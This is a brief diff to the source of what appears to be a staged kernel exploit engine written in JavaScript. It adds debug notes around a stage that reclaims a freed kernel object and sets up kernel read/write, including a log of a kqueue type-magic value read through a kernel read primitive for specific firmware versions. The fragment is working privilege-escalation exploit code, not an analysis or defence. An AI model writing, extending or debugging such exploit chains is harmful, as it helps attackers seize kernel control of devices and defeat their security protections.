@@ -1408,6 +1408,13 @@ export function makeBagagwaEngine(X) {
 
         note("=== Stage 4: reclaim freed osem + establish kernel R/W ===");
 
+        if (!S.fdOfiles && !S.masterPipeData && S.leakedAddrs.length === 0) {
+            note("NOTE: no kernel read primitive yet (fdOfiles=null, masterPipeData=null, "
+                + "leakedAddrs=" + S.leakedAddrs.length + "). The kqueue/curproc walks below "
+                + "need an initial kernel read, so they will find nothing until the Stage 2 "
+                + "727 leak returns kernel pointers.");
+        }
+
         if (S.targetOsemIdx < 0 && !o.force) {
             out.why = "no freed osem object to reclaim";
             return out;
@@ -1432,6 +1439,8 @@ export function makeBagagwaEngine(X) {
                 const fdata = await kread64Fast(fp.v.add32(OFF.FILE_F_DATA));
                 if (fdata.ret === 8 && isKernelPtr(fdata.v)) {
                     const magic = await kread32Fast(fdata.v.add32(0x08));
+                    if (i === 0) note("kqueue[0] type-magic @ f_data+0x08 = 0x" +
+                        magic.v.toString(16) + " (expected 0x1430000 on 12.x; may vary on 13.60)");
                     if (magic.v === 0x1430000) {
                         const fdp = await kread64Fast(fdata.v.add32(0xA8));
                         if (fdp.ret === 8 && isKernelPtr(fdp.v)) {
